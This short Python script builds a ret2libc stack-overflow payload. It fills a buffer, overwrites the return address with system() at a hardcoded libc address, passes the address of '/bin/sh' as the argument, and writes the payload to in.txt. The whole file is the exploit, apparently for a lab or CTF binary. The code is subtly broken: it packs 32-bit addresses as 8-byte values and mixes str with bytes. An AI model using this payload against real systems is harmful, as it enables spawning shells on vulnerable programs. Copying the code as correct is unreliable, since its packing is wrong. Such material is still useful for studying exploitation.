from struct import *

libc_base = 0xb7e17000
system_offset = 0x3ab40
binsh_offset = 0x15d8c8

system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset

payload = "A" * 32                           # buf
payload += "A" * 4                            # ebx
payload += pack("<Q", system_addr)           # ret addr : system()
payload += "B" * 4                           # fake ebp
payload += pack("<Q", binsh_addr)            # /bin/sh addr

f = open("in.txt", "w")
f.write(payload)
